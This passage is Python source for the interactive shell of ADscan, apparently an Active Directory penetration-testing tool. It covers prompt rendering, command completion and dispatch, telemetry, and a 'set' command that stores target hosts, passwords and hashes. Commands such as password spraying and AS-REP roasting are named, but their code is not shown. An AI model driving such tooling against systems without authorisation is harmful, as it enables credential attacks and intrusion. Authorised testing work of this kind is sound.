        has_ws_or_domain = False

        # Show current remote session context, if any
        current_session: Optional[RemoteSession] = None
        try:
            if hasattr(self, "session_manager"):
                current_session = self.session_manager.get_current_session()
        except Exception as e:
            telemetry.capture_exception(e)
            current_session = None
        if current_session is not None:
            prompt_text.append("@", style="white")
            host = current_session.peer_address[0]
            prompt_text.append(host, style="bold red")
            has_ws_or_domain = True
        if self.current_workspace:
            prompt_text.append(":", style="white")
            ws_name = (
                os.path.basename(str(self.current_workspace))
                if self.current_workspace
                else ""
            )
            prompt_text.append(ws_name, style="bold yellow")
            has_ws_or_domain = True

        if self.current_domain:
            prompt_text.append("/", style="white")
            prompt_text.append(self.current_domain, style="bold green")
            has_ws_or_domain = True

        # Add current working directory
        try:
            cwd = os.getcwd()
            home_dir = _get_effective_user_home()
            # Try to shorten the path if it's under the home directory and reasonably long
            if cwd.startswith(home_dir) and len(cwd) > len(home_dir) + 5:
                display_cwd = "~" + cwd[len(home_dir) :]
            else:
                display_cwd = cwd

            # Add a space separator if there was a workspace or domain before it, or a colon if not.
            if has_ws_or_domain:
                prompt_text.append(" ", style="white")
            else:  # If no workspace or domain, prefix CWD with a colon for ADScan: /path
                prompt_text.append(": ", style="white")

            prompt_text.append(display_cwd, style="bold magenta")  # CWD style
        except OSError as e:
            telemetry.capture_exception(e)
            # In case getcwd fails, e.g., directory deleted
            if has_ws_or_domain:
                prompt_text.append(" ", style="white")
            else:
                prompt_text.append(": ", style="white")
            prompt_text.append("[unknown_path]", style="dim red")

        prompt_text.append(") > ", style="white")
        return prompt_text

    def _get_bottom_toolbar_content(self):
        """Returns the HTML content for the bottom toolbar, or None if a sub-prompt is active."""
        # Check if a sub-prompt is active. If so, don't draw the toolbar.
        with self.prompt_interaction_lock:
            if self.is_sub_prompt_active:
                return None
        try:
            cwd = os.getcwd()
            home_dir = _get_effective_user_home()
            if cwd.startswith(home_dir) and len(cwd) > len(home_dir):
                path_part = cwd[len(home_dir) :]
                display_cwd = "~" + path_part if path_part else "~"
            else:
                display_cwd = cwd
        except OSError as e:
            telemetry.capture_exception(e)
            display_cwd = "[unknown path]"

        # Using prompt_toolkit's HTML for styling.
        # You can define styles in self.prompt_style or use inline styles.
        # Example inline: <style bg="#000000" fg="#ffffff">text</style>
        # Using classes from self.prompt_style for better management:
        # return HTML(
        #     f'<span class="toolbar.cwd"> CWD: {display_cwd} </span>'
        #     f'<span class="toolbar.sep"> | </span>'
        #     f'<span class="toolbar.keys">Ctrl+L:Clear Ctrl+C:Intr Ctrl+D:Exit</span>'
        # )
        # Build the toolbar content parts
        toolbar_parts = []
        toolbar_parts.append(
            f'<style bg="#2E3440" fg="#ECEFF4"> {display_cwd} </style>'
        )

        if self.myip:
            toolbar_parts.append('<style bg="#3B4252" fg="#88C0D0"> │ </style>')
            toolbar_parts.append(
                f'<style bg="#2E3440" fg="#A3BE8C">IP: {self.myip} </style>'
            )

        toolbar_parts.append('<style bg="#3B4252" fg="#88C0D0"> │ </style>')
        toolbar_parts.append(
            '<style bg="#2E3440" fg="#ECEFF4"><b>Ctrl+L</b>:Clear <b>Ctrl+C</b>:Intr <b>Ctrl+D</b>:Exit</style>'
        )

        return HTML("".join(toolbar_parts))

    def _get_available_interfaces(self):
        """Returns a list of available network interface names."""
        try:
            return list(psutil.net_if_addrs().keys())
        except Exception as e:
            telemetry.capture_exception(e)
            # self.console.print(f"[dim]Could not fetch interfaces: {e}[/dim]") # Optional debug
            return []

    def _register_commands(self):
        """Registers all 'do_*' methods as available commands."""
        for name in dir(self):
            if name.startswith("do_"):
                method = getattr(self, name)
                if callable(method):
                    self.commands[name[3:]] = method

    def check_background_tasks(self):
        """Cleans completed tasks from the list"""
        self.background_tasks = [t for t in self.background_tasks if t.is_alive()]

    def do_clear(self, _arg):
        """Clears the terminal screen."""
        self.console.clear()
        # Prompt redrawing is handled by the prompt_toolkit loop automatically

    @staticmethod
    def _resolve_prompt_history_path_for_workspace(
        workspace_dir: str | None,
    ) -> str:
        """Return the prompt history file path for the active workspace context."""
        history_filename = ".adscan_history"
        if workspace_dir:
            return os.path.join(workspace_dir, history_filename)
        return os.path.join(ADSCAN_BASE_DIR, history_filename)

    @staticmethod
    def _maybe_refresh_prompt_session_for_workspace(
        *,
        current_history_path: str,
        current_workspace_dir: str | None,
        session_factory: Callable[[str], PromptSession],
    ) -> tuple[str, PromptSession | None]:
        """Return a fresh prompt session when workspace history path changed."""
        desired_history_path = PentestShell._resolve_prompt_history_path_for_workspace(
            current_workspace_dir
        )
        if desired_history_path == current_history_path:
            return current_history_path, None
        os.makedirs(os.path.dirname(desired_history_path), exist_ok=True)
        return desired_history_path, session_factory(desired_history_path)

    def run(self):
        """Main loop for the interactive shell using prompt-toolkit."""
        if not self.current_workspace:
            print_panel(
                "[bold]ADscan cannot enter the interactive shell without an active workspace.[/bold]\n\n"
                "Start the session again and select or create a workspace first.\n\n"
                "[dim]This guardrail prevents partial failures later when commands try to save "
                "credentials, domain state, or artifacts into workspace-scoped paths.[/dim]",
                title="[bold]Workspace Required[/bold]",
                border_style="red",
                padding=(1, 2),
            )
            print_warning(
                "Interactive shell not started because no workspace is active."
            )
            return

        history_path = self._resolve_prompt_history_path_for_workspace(
            self.current_workspace_dir
        )
        os.makedirs(os.path.dirname(history_path), exist_ok=True)

        set_variables = [
            "hosts",
            "myip",
            "iface",
            "pdc",
            "pdc_hostname",
            "domain",
            "auto",
            "type",  # Added 'type'
            "username",
            "password",
            "hash",
            "base_dn",
        ]
        # For 'auto', we might want to suggest True/False later if we enhance NestedCompleter capabilities
        # or use a custom completer for 'set auto'. For now, just the variable name.

        # Define completers for specific arguments of 'set'
        set_args_completers = {
            var: None
            for var in set_variables  # Default to no specific value completer
        }
        set_args_completers["auto"] = WordCompleter(["True", "False"], ignore_case=True)
        set_args_completers["type"] = WordCompleter(
            ["ctf", "audit"], ignore_case=True
        )  # Added completer for 'type'
        set_args_completers["iface"] = InterfaceCompleter(
            self
        )  # Use our custom completer

        # Path completers for file system commands
        dir_completer = PathCompleter(only_directories=True, expanduser=True)
        file_dir_completer = PathCompleter(expanduser=True)

        def _extract_options_from_method(method):
            """Extract valid options from method source code by looking for validation patterns.

            Looks for patterns like:
            - if ... not in ["option1", "option2"]:
            - if ... in ["option1", "option2"]:

            Returns WordCompleter if options found, None otherwise.
            """
            try:
                source = inspect.getsource(method)
                # Pattern to match: if ... not in ["opt1", "opt2"]: or if ... in ["opt1", "opt2"]:
                # Matches both single and double quotes, and handles whitespace
                pattern = r"if\s+[^\n]*\s+(?:not\s+)?in\s+\[([^\]]+)\]"
                matches = re.findall(pattern, source)

                for match in matches:
                    # Extract string literals from the list
                    # Match both 'string' and "string" patterns
                    options = re.findall(r'["\']([^"\']+)["\']', match)
                    if options and len(options) >= 2:  # At least 2 options to be useful
                        # Filter out common false positives (like error messages, variable names)
                        # Only include options that look like valid command arguments (lowercase, short)
                        valid_options = [
                            opt
                            for opt in options
                            if opt.islower()
                            and len(opt) < 20
                            and opt.replace("_", "").isalnum()
                        ]
                        if valid_options:
                            return WordCompleter(valid_options, ignore_case=True)
            except (OSError, TypeError, AttributeError):
                # Method might be from C extension, or source unavailable
                pass
            return None

        # Initial completers for specific commands
        completer_dict = {
            "set": set_args_completers,
            "help": WordCompleter(list(self.commands.keys()), ignore_case=True),
        }

        # Instance of our custom completers
        domain_completer_instance = DomainCompleter(self)
        smart_completer_instance = SmartCommandCompleter(
            self
        )  # Smart domain + credential completer

        # List of commands that expect a domain as their first argument
        commands_expecting_domain = ["start_auth", "reset_attack_path_statuses"]
        domain_prefixes = [
            "smb",
            "ldap",
            "netexec",
            "cve",
            "bloodhound",
        ]  # List of prefixes that require domain autocompletion

        # Populate completer_dict for other commands
        domain_param_names = {
            "domain",
            "target_domain",
            "domain_name",
        }  # Common names for domain parameters

        # Auto-detection: parameter names that suggest credential usage
        credential_param_names = {
            "username",
            "user",
            "password",
            "cred",
            "credentials",
            "hash",
        }

        for (
            cmd_stem
        ) in self.commands.keys():  # cmd_stem is 'asreproast', 'spraying', 'cd', etc.
            if cmd_stem not in completer_dict:  # completer_dict keys are also stems
                actual_method_name = "do_" + cmd_stem  # e.g., 'do_asreproast'
                apply_domain_completer = False
                apply_credential_completer = False

                # 1. Check explicit stem list (commands_expecting_domain contains stems)
                if cmd_stem in commands_expecting_domain:
                    apply_domain_completer = True
                # 2. Check stem prefixes (domain_prefixes contains prefixes to check against the stem)
                elif any(cmd_stem.startswith(prefix) for prefix in domain_prefixes):
                    apply_domain_completer = True
                # 3. Inspect direct parameters of the actual do_* method
                else:
                    try:
                        method_to_inspect = getattr(self, actual_method_name, None)
                        if method_to_inspect and callable(method_to_inspect):
                            sig = inspect.signature(method_to_inspect)
                            # Iterate over parameter names, skipping 'self'
                            param_names_to_check = [
                                p for p in sig.parameters if p != "self"
                            ]
                            for param_name in param_names_to_check:
                                if param_name in domain_param_names:
                                    apply_domain_completer = True
                                    # Auto-detect if command also uses credentials
                                    # If it has domain param, check for credential params too
                                if param_name in credential_param_names:
                                    apply_credential_completer = True
                    except Exception as e:
                        telemetry.capture_exception(e)
                        pass  # Ignore errors during inspection

                # Assign completer to the command stem key
                # Priority: Smart completer (domain + creds) > Domain only > File/Dir > Auto-detect
                if apply_domain_completer and apply_credential_completer:
                    # Command needs both domain and credentials: use smart completer
                    completer_dict[cmd_stem] = smart_completer_instance
                elif apply_domain_completer:
                    # Command only needs domain: use domain completer
                    completer_dict[cmd_stem] = domain_completer_instance
                elif apply_credential_completer:
                    # Command only needs credentials (no domain): use credential completer
                    # This is rare but possible (e.g., local commands)
                    completer_dict[cmd_stem] = smart_completer_instance
                elif cmd_stem == "cd":
                    completer_dict[cmd_stem] = dir_completer
                elif cmd_stem in [
                    "ls",
                    "rm",
                    "cp",
                    "mv",
                    "cat",
                    "edit",
                    "less",
                    "more",
                    "head",
                    "tail",
                    "system",
                ]:
                    completer_dict[cmd_stem] = file_dir_completer
                else:
                    # Try to auto-detect options from method source code
                    try:
                        method_to_inspect = getattr(self, actual_method_name, None)
                        if method_to_inspect and callable(method_to_inspect):
                            auto_completer = _extract_options_from_method(
                                method_to_inspect
                            )
                            if auto_completer:
                                completer_dict[cmd_stem] = auto_completer
                            else:
                                completer_dict[cmd_stem] = None
                        else:
                            completer_dict[cmd_stem] = None
                    except Exception as e:
                        telemetry.capture_exception(e)
                        completer_dict[cmd_stem] = None  # Fallback on error

        command_completer = NestedCompleter.from_nested_dict(completer_dict)

        kb = KeyBindings()

        @kb.add("c-l")
        def _(event):
            """Clear screen."""
            event.app.renderer.clear()

        # Define a style for our lexer
        # These are just examples, you can customize colors and attributes (bold, italic, etc.)
        self.prompt_style = PromptStyle.from_dict(
            {
                "command": "#ansigreen bold",  # e.g., bright green and bold for commands
                "argument": "#ansiwhite",  # e.g., white for arguments
                "default": "#ansicyan",  # e.g., cyan for default text / unknown commands
                # You can also style prompt-toolkit's own elements if needed, e.g.:
                # 'completion-menu.completion.current': 'bg:#00aaaa #000000',
                # 'completion-menu.completion': 'bg:#008888 #ffffff',
                # Styles for the toolbar (optional, can also be done with inline HTML styles)
                "toolbar.cwd": "bg:#333333 #ffffff bold",
                "toolbar.keys": "bg:#333333 #d4d4d4",
                "toolbar.sep": "bg:#333333 #888888",
            }
        )

        command_lexer = SimpleCommandLexer(list(self.commands.keys()))

        def _build_prompt_session(resolved_history_path: str) -> PromptSession:
            return PromptSession(
                history=FileHistory(resolved_history_path),
                auto_suggest=AutoSuggestFromHistory(),  # Temporarily commented out
                completer=command_completer,
                key_bindings=kb,
                lexer=command_lexer,
                style=self.prompt_style,
                bottom_toolbar=self._get_bottom_toolbar_content,  # Temporarily commented out
                # reserve_space_for_menu=8, # Max 8 lines for completion menu
                # enable_history_search=True, # Temporarily commented out
                # refresh_interval=0.5 # Optional: for dynamic prompts, not strictly needed here
            )

        session = _build_prompt_session(history_path)

        # Initial display before the first prompt (if any)
        # self.console.print(self._get_rich_prompt_object(), end="") # The prompt is now part of session.prompt

        while True:
            self.check_background_tasks()
            try:
                # >>> START OF MODIFICATION <<<
                should_skip_prompt_this_iteration = False
                with self.prompt_interaction_lock:
                    if self.is_sub_prompt_active:
                        should_skip_prompt_this_iteration = True

                if should_skip_prompt_this_iteration:
                    time.sleep(0.05)  # Brief pause to yield CPU
                    continue  # Skip to next iteration, effectively polling

                # >>> END OF MODIFICATION <<<
                refreshed_history_path, refreshed_session = (
                    self._maybe_refresh_prompt_session_for_workspace(
                        current_history_path=history_path,
                        current_workspace_dir=self.current_workspace_dir,
                        session_factory=_build_prompt_session,
                    )
                )
                if refreshed_session is not None:
                    print_info_debug(
                        "[prompt] Switching command history to workspace file: "
                        f"{mark_sensitive(refreshed_history_path, 'path')}"
                    )
                    history_path = refreshed_history_path
                    session = refreshed_session

                def get_prompt_message_callable():
                    # Default fallback Rich Text prompt
                    default_prompt_text = Text("(ADscan) > ", style="white")
                    prompt_to_render = default_prompt_text

                    if hasattr(self, "_get_rich_prompt_object") and callable(
                        self._get_rich_prompt_object
                    ):
                        try:
                            # Get the Rich Text object from your method
                            rich_prompt_obj = self._get_rich_prompt_object()
                            if isinstance(rich_prompt_obj, Text):
                                prompt_to_render = rich_prompt_obj
                            # else: it will use the default_prompt_text
                        except Exception as e:
                            telemetry.capture_exception(e)
                            # Log error if needed, and fall back to default
                            # self.console.print(f"Error getting rich prompt: {e}", style="dim red")
                            pass  # Fallback to default_prompt_text

                    # Convert the Rich Text object to an ANSI string
                    # Use a temporary Rich Console instance that writes to a StringIO buffer
                    # and forces ANSI output.
                    # We use a new Console instance here to avoid interfering with self.console's state/destination.
                    # It's important to pass a width to this console, otherwise Rich might format
                    # the prompt assuming a default width, which could be different from the actual terminal.
                    capture_buffer = StringIO()
                    temp_capture_console = Console(
                        file=capture_buffer,
                        force_terminal=True,  # Essential for ANSI codes
                        color_system="truecolor",  # Or "standard", "256"
                        width=self.console.width
                        if hasattr(self.console, "width")
                        else 80,  # Use main console width or a default
                        theme=ADSCAN_THEME,
                    )
                    temp_capture_console.print(
                        prompt_to_render, end=""
                    )  # Print the rich object
                    ansi_prompt_string = capture_buffer.getvalue()
                    capture_buffer.close()

                    return ANSI(ansi_prompt_string)  # Return ANSI formatted string

                user_input = session.prompt(get_prompt_message_callable)

                if not user_input.strip():
                    continue

                def _extract_raw_args(original_input: str, cmd: str) -> str:
                    """Return the raw argument string after the command name.

                    This preserves quoting and pipe characters from the user's input.
                    We need this for commands like `system` that intentionally pass a
                    shell string through to `/bin/sh -c ...`.
                    """
                    stripped = original_input.lstrip()
                    if not stripped:
                        return ""
                    cmd_len = len(cmd)
                    if stripped[:cmd_len].lower() != cmd.lower():
                        return ""
                    return stripped[cmd_len:].lstrip()

                try:
                    parts = shlex.split(user_input)
                except ValueError as e:
                    telemetry.capture_exception(e)
                    print_warning("Error: Mismatched quotes in input.")
                    continue

                if not parts:
                    continue

                command_name = parts[0].lower()
                args_list = parts[1:]
                normalized_command, normalized_args, command_alias_used = (
                    normalize_command_alias(
                        command_name,
                        args_list,
                        known_commands=set(self.commands.keys()),
                    )
                )
                if command_alias_used:
                    print_info_debug(
                        f"[cli] Command alias detected: {command_name} {' '.join(args_list)} -> "
                        f"{normalized_command} {' '.join(normalized_args)}"
                    )
                    command_name = normalized_command
                    args_list = normalized_args
                normalized_command, normalized_args, help_alias_used = (
                    normalize_help_alias(
                        command_name,
                        args_list,
                        known_commands=set(self.commands.keys()),
                    )
                )
                if help_alias_used:
                    print_info_debug(
                        f"[cli] Help alias detected: {command_name} {' '.join(args_list)} -> "
                        f"{normalized_command} {' '.join(normalized_args)}"
                    )
                    command_name = normalized_command
                    args_list = normalized_args

                marked_user_input = mark_sensitive(user_input.strip(), "text")
                print_info_debug(f"[cli] Execute command: {marked_user_input}")
                log_cli_command_context(self, command_name, args_list, source="cli")
                # Re-join for do_* methods that expect a raw string.
                # Re-quote any token that contains whitespace so that a
                # downstream shlex.split() reconstructs the original tokens
                # (e.g. --client 'My Client Name' must not be split on the
                # spaces inside the value).
                import shlex as _shlex
                arg_string = " ".join(
                    _shlex.quote(a) if " " in a or not a else a
                    for a in args_list
                )
                raw_arg_string = _extract_raw_args(user_input, parts[0])

                # Send telemetry event for commands (excluding blacklist)
                telemetry_blacklist = {"start_auth", "start_unauth", "exit", "quit"}
                if command_name not in telemetry_blacklist:
                    try:
                        if command_name in ("set", "workspace", "creds"):
                            # For commands with arguments, use "command arg" as event name
                            if args_list:
                                event_name = f"{command_name} {args_list[0]}"
                            else:
                                event_name = command_name
                            telemetry.capture(event_name)
                        else:
                            telemetry.capture(command_name)

                        # Increment command count for session tracking
                        self._session_commands_count += 1
                    except Exception:
                        pass

                if command_name in ["exit", "quit"]:
                    if hasattr(self, "do_exit") and callable(self.do_exit):
                        # Assuming do_exit now returns True to signal exit, False to cancel
                        if self.do_exit(arg_string):
                            break
                    else:
                        # Default exit behavior if no do_exit or it's not a confirming one
                        if Confirm.ask("Are you sure you want to exit?", default=False):
                            break
                    continue  # If exit was cancelled

                cmd_method = self.commands.get(command_name)
                if cmd_method:
                    try:
                        if not ensure_initialized_domain_context_for_command(
                            self,
                            command_name=command_name,
                            args_list=args_list,
                            command_method=cmd_method,
                        ):
                            continue
                        # `system` needs the raw string to preserve pipes/quotes.
                        if command_name == "system":
                            cmd_method(raw_arg_string)
                        else:
                            cmd_method(arg_string)  # Call the original do_* method
                    except Exception as e:
                        telemetry.capture_exception(e)
                        print_error(f"Error executing command '{command_name}'.")
                        print_exception(show_locals=False, exception=e)
                        print_exception(show_locals=True, exception=e)
                else:
                    print_warning(f"Unknown command: {command_name}")
                    if should_show_workspace_getting_started(self):
                        print_info(
                            "This workspace has not started a scan yet. "
                            "Run `start_unauth` or `start_auth` to begin."
                        )
                        print_info(
                            "Need examples? Type `help` or open "
                            "https://www.adscanpro.com/docs"
                        )
                    print_info(
                        "If you want to execute a command, use the 'system' command. "
                        "Example: system ping 127.0.0.1"
                    )

            except KeyboardInterrupt:
                _log_interrupt_debug(
                    kind="keyboard_interrupt", source="pentestshell.prompt_loop"
                )
                print_warning("\nKeyboardInterrupt. Type 'exit' or 'quit' to exit.")
                # Optionally, add a small delay or a clear visual break
                continue
            except EOFError:
                _log_interrupt_debug(kind="eof", source="pentestshell.prompt_loop")
                self.do_exit("")
                break

        # cleanup_on_exit may be set dynamically, so we check with hasattr first
        cleanup_method = getattr(self, "cleanup_on_exit", None)
        cleanup_callable: Callable[[], Any] | None = (
            cleanup_method if callable(cleanup_method) else None
        )
        if cleanup_callable is not None:
            cleanup_callable()

    def show_intro(self):
        # pylint: disable=invalid-name
        from rich.rule import Rule
        from adscan_internal.branding import (
            ADSCAN_LINKS,
            ADSCAN_TAGLINE,
            build_gradient_ascii,
        )
        from adscan_core.theme import ADSCAN_PRIMARY, ADSCAN_PRIMARY_DIM

        version_tag = _format_runtime_version_tag(self.license_mode)

        # ASCII logo with brand gradient (shared with Textual TUI splash)
        self.console.print(build_gradient_ascii(self.console.width))

        # Version + edition on one clean line
        license_mode = str(getattr(self, "license_mode", "LITE") or "LITE").upper()
        badge_style = (
            f"bold {ADSCAN_PRIMARY}" if license_mode == "PRO" else "bold #d29922"
        )
        self.console.print(
            f"  [bold {ADSCAN_PRIMARY}]ADscan[/bold {ADSCAN_PRIMARY}]"
            f"  [dim]{version_tag}[/dim]"
            f"  [{badge_style}]{license_mode}[/{badge_style}]"
        )

        # Tagline (shared with Textual TUI)
        self.console.print(
            f"  [italic {ADSCAN_PRIMARY_DIM}]{ADSCAN_TAGLINE}[/italic {ADSCAN_PRIMARY_DIM}]"
        )

        # Separator
        self.console.print(Rule(style=f"dim {ADSCAN_PRIMARY}"))

        # Links footer — compact, single line
        raw_docs = ADSCAN_LINKS["docs"]
        raw_gh = ADSCAN_LINKS["github"]
        raw_dc = ADSCAN_LINKS["discord"]
        raw_li = ADSCAN_LINKS["linkedin"]
        self.console.print(
            f"  [dim][link={raw_docs}]📚 Docs[/link]"
            f"  ·  [link={raw_gh}]🔗 GitHub[/link]"
            f"  ·  [link={raw_dc}]💬 Discord[/link]"
            f"  ·  [link={raw_li}]💼 LinkedIn[/link][/dim]"
            f"  [dim]·  © 2026 Yeray Martín[/dim]"
        )
        # ── Tier-aware intro — branched dispatch (LITE vs PRO).
        # Source of truth: adscan_core.welcome_host.render_intro.
        try:
            from adscan_core.welcome_host import render_intro
            from rich.padding import Padding as _Padding
            self.console.print(_Padding(render_intro(), (0, 2)))
        except Exception:  # noqa: BLE001 — splash must never break
            pass
        self.console.print()

    def do_set(self, args):
        """
        Configure program variables.

        Usage: set <variable> <value>

        Available variables:

        - hosts: list of hosts to scan
        - iface: network interface to use. Automatically adds the interface's IP to the myip variable
        - auto: enable or disable automatic mode. It will run the scan without prompting (automatic) or by prompting the user (semi-automatic)
        - type: set the pentest type. Must be 'ctf' for CTF scenarios or 'audit' for real audits. This setting is mandatory before starting scans.

        Examples:

        set hosts 192.168.1.0/24, set hosts 192.168.1.10-23
        set iface eth0
        set auto True
        set type ctf
        set telemetry on
        """
        try:
            # Split only on the first space to separate variable from values
            parts = args.split(None, 1)
            if len(parts) != 2:
                print_error("Incorrect usage: set <variable> <value>")
                return

            variable, value = parts

            if variable == "hosts":
                self.hosts = value
                print_success(f"Hosts configured: {self.hosts}")
            elif variable == "myip":
                self.myip = value
                print_success(f"My IP configured: {self.myip}")
            elif variable == "iface":
                self.interface = value
                ip = self.set_interface_ip(value)
                if ip:
                    print_success(
                        f"Interface configured: {self.interface} with IP: {self.myip}"
                    )
                else:
                    print_error(f"Could not get IP for interface {self.interface}")
            elif variable == "pdc":
                self.pdc = value
                marked_pdc_1 = mark_sensitive(self.pdc, "ip")
                print_success(f"PDC configured: {marked_pdc_1}")
            elif variable == "pdc_hostname":
                self.pdc_hostname = value
                marked_pdc_hostname_1 = mark_sensitive(self.pdc_hostname, "hostname")
                print_success(f"PDC hostname configured: {marked_pdc_hostname_1}")
            elif variable == "domain":
                self.domains.append(value)
                print_success(
                    f"Domain configured: {value}"
                )  # Use value as self.domain might not be set yet
            elif variable == "auto":
                if value.lower() == "false":
                    self.auto = False
                elif value.lower() == "true":
                    self.auto = True
                else:
                    print_error("Please set the value of auto to True or False")
                    return
                print_success(f"Auto mode configured: {self.auto}")
            elif variable == "type":
                if value.lower() in ["ctf", "audit"]:
                    self.type = value.lower()
                    print_info(f"Pentest type configured: {self.type}.")
                    if self.type == "ctf":
                        self.auto = True
                        print_warning(
                            "Be aware that auto mode has been enabled. If you want to disable it, use 'set auto False'."
                        )
                else:
                    print_error("Invalid type. Please use 'ctf' or 'audit'.")
            elif variable == "telemetry":
                if value.lower() in ["true", "on", "1"]:
                    self.telemetry = True
                elif value.lower() in ["false", "off", "0"]:
                    self.telemetry = False
                else:
                    print_error("Please set telemetry to on/true/1 or off/false/0")
                    return
                print_success(f"Telemetry configured: {self.telemetry}")
                from adscan_internal.cli.common import build_telemetry_context

                telemetry_context = build_telemetry_context(
                    shell=self,
                    trigger="set_telemetry",
                )
                telemetry.set_cli_telemetry(self.telemetry, context=telemetry_context)

            elif variable == "username":
                self.domains_data[self.domain]["username"] = value
                marked_username_1 = mark_sensitive(
                    self.domains_data[self.domain]["username"], "user"
                )
                print_success(f"User configured: {marked_username_1}")
            elif variable == "password":
                self.domains_data[self.domain]["password"] = value
                marked_username_1 = mark_sensitive(
                    self.domains_data[self.domain]["username"], "user"
                )
                print_success(
                    f"Password for user {marked_username_1} configured."
                )  # Avoid printing password
            elif variable == "hash":
                self.hash = value
                marked_username_1 = mark_sensitive(self.username, "user")
                print_success(
                    f"Hash for user {marked_username_1} configured."
                )  # Avoid printing hash
            elif variable == "base_dn":
                # Consider using rich.prompt.Prompt for input later
                input_domain = Prompt.ask(
                    "[b cyan]Enter the domain for this Base DN: [/b cyan]"
                )
                self.domains_data[input_domain]["base_dn"] = value
                print_success(
                    f"Base DN for domain {input_domain} configured: {self.domains_data[input_domain]['base_dn']}"
                )

            else:
                print_error(f"Variable {variable} not recognized.")
        except ValueError as e:
            telemetry.capture_exception(e)
            print_error("Error processing set command.")
            print_exception(show_locals=False, exception=e)
        except Exception as e:
            telemetry.capture_exception(e)
            print_error("An unexpected error occurred in 'set'.")
            print_exception(show_locals=False, exception=e)

    def set_interface_ip(self, interface):
        """
        Sets the myip variable by obtaining the IP assigned to the specified interface.
        Returns the configured IP or None if it could not be obtained.
        """
        try:
            from adscan_internal.services.network_preflight_service import (
                get_interface_ipv4_addresses,
            )

            ips = get_interface_ipv4_addresses(interface)
            if ips:
                self.myip = ips[0]
                return self.myip
            print_error(f"The interface '{interface}' does not have an assigned IP.")
            return None
        except Exception as e:
            print_error(f"Error obtaining IP for interface '{interface}'.")
            print_exception(show_locals=False, exception=e)
            return None

    def do_update(self, _args):
        print_info("Updating the script...")

        self.workspace_save()

        # Reload the current script
        self.run_script()

    def run_script(self):
        """Reloads the current script."""
        exec(open("/usr/bin/adscan.py").read())

    def show_domains_data(self, as_text=False):
        """Displays the information of each configured domain using Rich Table or returns Text."""
        if not self.domains_data:
            if as_text:
                return Text("No domain data loaded.\n", style="italic yellow")
            print_warning("No domain data loaded.")
            return None  # Explicitly return None if not as_text and no data

        if as_text:
            text_output = Text(
                "\n--- Domain Data ---\n", style="bold underline magenta"
            )
            # Sort domains for consistent output
            sorted_domain_keys = sorted(
                self.domains_data.keys(), key=lambda x: (x is None, x)
            )
            for domain_key in sorted_domain_keys:
                data = self.domains_data[domain_key]
                text_output.append(f"Domain: {domain_key}\n", style="bold green")
                if data:  # Check if data is not None or empty
                    sorted_data_keys = sorted(data.keys())
                    for key in sorted_data_keys:
                        value = data[key]
                        val_display = str(value)
                        text_output.append(f" {key.capitalize()}: ", style="cyan")
                        text_output.append(f"{val_display}\n", style="white")
                else:
                    text_output.append(
                        "  No specific data for this domain.\n", style="italic"
                    )
                text_output.append("---\n", style="magenta")
            return text_output
        # Not as_text, show table
        from adscan_internal.rich_output import BRAND_COLORS

        table = Table(
            title="[bold]Configured Domain Data[/bold]",
            show_header=True,
            header_style=f"bold {BRAND_COLORS['info']}",
            border_style=BRAND_COLORS["info"],
        )
        table.add_column("Domain", style="dim green", width=25, overflow="fold")
        table.add_column(
            "Property", style=BRAND_COLORS["info"], width=20, overflow="fold"
        )
        table.add_column("Value", style="white", overflow="fold")

        sorted_domain_keys = sorted(
            self.domains_data.keys(), key=lambda x: (x is None, x)
        )
        for i, domain_key in enumerate(sorted_domain_keys):
            data = self.domains_data[domain_key]
            first_row_for_domain = True
            if not data:
                table.add_row(
                    str(domain_key),
                    Text("N/A", style="italic"),
                    Text("N/A", style="italic"),
                )
            else:
                sorted_data_keys = sorted(data.keys())
                for key in sorted_data_keys:
                    value = data[key]
                    val_display = str(value)
                    if first_row_for_domain:
                        table.add_row(str(domain_key), key.capitalize(), val_display)
                        first_row_for_domain = False
                    else:
                        table.add_row("", key.capitalize(), val_display)

            if (
                i < len(sorted_domain_keys) - 1
            ):  # Add a section end only if not the last domain
                table.add_section()

        from adscan_internal.rich_output import print_table

        print_table(table)
        return None  # Explicitly return None when printing table

